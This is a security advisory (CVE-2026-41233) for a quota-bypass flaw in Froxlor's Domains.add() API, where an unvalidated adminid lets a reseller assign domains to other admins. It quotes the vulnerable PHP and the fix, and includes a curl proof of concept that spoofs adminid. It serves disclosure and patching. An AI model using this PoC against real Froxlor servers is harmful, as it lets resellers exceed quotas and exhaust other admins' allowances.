# [M] Froxlor has a Reseller Domain Quota Bypass via Unvalidated adminid Parameter in Domains.add()

## Summary
Severity: Medium
Advisory: GHSA-jvx4-xv3m-hrj4
CVE: CVE-2026-41233
CWE: CWE-863
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-jvx4-xv3m-hrj4
Type: github-advisory

## Affected
- Packagist: `froxlor/froxlor` — affected >=0 <2.3.6

## Details
## Summary

In `Domains.add()`, the `adminid` parameter is accepted from user input and used without validation when the calling reseller does not have the `customers_see_all` permission. This allows a reseller to attribute newly created domains to any other admin, bypassing their own domain quota (since the wrong admin's `domains_used` counter is incremented) and potentially exhausting another admin's quota.

## Details

In `lib/Froxlor/Api/Commands/Domains.php`, the `add()` method accepts `adminid` as an optional parameter at line 327:

```php
$adminid = intval($this->getParam('adminid', true, $this->getUserDetail('adminid')));
```

The validation for this parameter only runs when the caller has `customers_see_all == '1'` (lines 410-421):

```php
if ($this->getUserDetail('customers_see_all') == '1' && $adminid != $this->getUserDetail('adminid')) {
    $admin_stmt = Database::prepare("
        SELECT * FROM `" . TABLE_PANEL_ADMINS . "`
        WHERE `adminid` = :adminid AND (`domains_used` < `domains` OR `domains` = '-1')");
    $admin = Database::pexecute_first($admin_stmt, [
        'adminid' => $adminid
    ], true, true);
    if (empty($admin)) {
        Response::dynamicError("Selected admin cannot have any more domains or could not be found");
    }
    unset($admin);
}
```

When a reseller does **not** have `customers_see_all` (the common case for limited resellers), there is no `else` branch to force `$adminid = $this->getUserDetail('adminid')`. The unvalidated `$adminid` flows directly into:

1. The domain INSERT at line 757: `'adminid' => $adminid`
2. The quota increment at lines 862-868:
```php
$upd_stmt = Database::prepare("
    UPDATE `" . TABLE_PANEL_ADMINS . "` SET `domains_used` = `domains_used` + 1
    WHERE `adminid` = :adminid
");
Database::pexecute($upd_stmt, ['adminid' => $adminid], true, true);
```

Compare with `Domains.update()` at lines 1386-1387 which correctly handles this case:

```php
} else {
    $adminid = $result['adminid'];
}
```

The initial quota check at line 321 checks the *caller's* own quota (`$this->getUserDetail('domains_used')`), but since the caller's `domains_used` is never incremented (the wrong admin's counter is incremented instead), this check passes indefinitely.

Note: The `getCustomerData()` call at line 407 does correctly restrict the `customerid` to the reseller's own customers (via `Customers.get` which filters by `adminid`). However, this does not prevent the `adminid` field itself from being spoofed.

## PoC

```bash
# Step 1: Create a domain with the reseller's API key, specifying a different admin's ID
curl -s -u RESELLER_API_KEY:RESELLER_API_SECRET -X POST https://froxlor.example/api.php \
  -d '{"command": "Domains.add", "params": {"domain": "bypass-test-1.com", "customerid": 3, "adminid": 1}}'

# Where:
# - RESELLER_API_KEY:RESELLER_API_SECRET = API credentials for a reseller WITHOUT customers_see_all
# - customerid=3 = one of the reseller's own customers
# - adminid=1 = the super-admin's ID (or any other admin's ID)

# Step 2: Verify the domain was created with adminid=1
# In the database: SELECT adminid, domain FROM panel_domains WHERE domain='bypass-test-1.com';
# Expected: adminid=1

# Step 3: Check the reseller's quota was NOT incremented
# In the database: SELECT adminid, domains_used, domains FROM panel_admins WHERE adminid=<reseller_id>;
# Expected: domains_used unchanged

# Step 4: Check the target admin's quota WAS incremented
# In the database: SELECT adminid, domains_used, domains FROM panel_admins WHERE adminid=1;
# Expected: domains_used incremented by 1

# Step 5: Repeat with different domain names to demonstrate unlimited creation
curl -s -u RESELLER_API_KEY:RESELLER_API_SECRET -X POST https://froxlor.example/api.php \
  -d '{"command": "Domains.add", "params": {"domain": "bypass-test-2.com", "customerid": 3, "adminid": 1}}'

curl -s -u RESELLER_API_KEY:RESELLER_API_SECRET -X POST https://froxlor.example/api.php \
  -d '{"command": "Domains.add", "params": {"domain": "bypass-test-3.com", "customerid": 3, "adminid": 1}}'

# The reseller's domains_used remains unchanged, allowing indefinite creation
```

## Impact

1. **Quota bypass**: A reseller can create unlimited domains beyond their allocated quota, since their own `domains_used` counter is never incremented.
2. **Quota exhaustion DoS**: The target admin's `domains_used` counter is incremented instead, potentially exhausting their quota and preventing legitimate domain creation.
3. **Data integrity violation**: Domains are associated with an admin who does not own the customer, breaking the ownership model. These domains become invisible to the reseller in domain listings (which filter by `adminid`) but remain active on the server.
4. **Accounting inaccuracy**: Resource usage reporting and billing tied to admin quotas becomes incorrect.

## Recommended Fix

Add an `else` branch to force `$adminid` to the caller's own admin ID when `customers_see_all != '1'`, consistent with the pattern used in `Domains.update()`:

```php
// In lib/Froxlor/Api/Commands/Domains.php, after line 421:

if ($this->getUserDetail('customers_see_all') == '1' && $adminid != $this->getUserDetail('adminid')) {
    $admin_stmt = Database::prepare("
        SELECT * FROM `" . TABLE_PANEL_ADMINS . "`
        WHERE `adminid` = :adminid AND (`domains_used` < `domains` OR `domains` = '-1')");
    $admin = Database::pexecute_first($admin_stmt, [
        'adminid' => $adminid
    ], true, true);
    if (empty($admin)) {
        Response::dynamicError("Selected admin cannot have any more domains or could not be found");
    }
    unset($admin);
} else {
    // Force adminid to the caller's own ID when they don't have customers_see_all
    $adminid = intval($this->getUserDetail('adminid'));
}
```

## References
- https://github.com/froxlor/froxlor/security/advisories/GHSA-jvx4-xv3m-hrj4
- https://nvd.nist.gov/vuln/detail/CVE-2026-41233
- https://github.com/froxlor/froxlor/commit/bf47ba15329506e9f9662f9462463932aa80dff5
- https://github.com/froxlor/froxlor
- https://github.com/froxlor/froxlor/releases/tag/2.3.6
